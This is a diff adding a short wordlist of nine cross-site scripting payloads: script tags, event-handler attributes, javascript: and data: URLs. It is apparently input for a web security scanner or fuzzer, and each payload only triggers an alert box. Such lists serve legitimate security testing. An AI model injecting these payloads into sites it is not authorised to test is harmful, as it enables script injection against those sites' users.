@@ -1,0 +1,14 @@
+# Custom XSS Payloads
+<script>alert('Custom XSS 1')</script>
+<img src="x" onerror="alert('Custom XSS 2')">
+<svg onload="alert('Custom XSS 3')">
+<iframe src="javascript:alert('Custom XSS 4')">
+'><script>alert('Custom XSS 5')</script>
+# Advanced payload
+<details open ontoggle="alert('Custom XSS 6')">
+# Event handlers
+<input onfocus="alert('Custom XSS 7')" autofocus>
+# JavaScript URL
+javascript:alert('Custom XSS 8')
+# Data URL
+data:text/html,<script>alert('Custom XSS 9')</script>
